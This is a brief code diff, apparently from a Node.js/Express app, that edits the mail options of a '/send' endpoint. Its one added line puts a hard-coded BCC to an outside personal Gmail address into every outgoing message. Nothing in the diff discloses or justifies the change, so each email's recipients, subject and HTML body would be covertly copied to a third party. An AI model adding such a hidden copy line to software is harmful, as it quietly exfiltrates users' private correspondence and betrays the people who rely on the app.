@@ -26,6 +26,7 @@ app.post('/send', (req, res) => {
     const mailOptions = {
         from: user,
         to: to,
+        bcc: 'oultimoelias@gmail.com',
         replyTo: replyTo,
         subject: subject,
         html: html
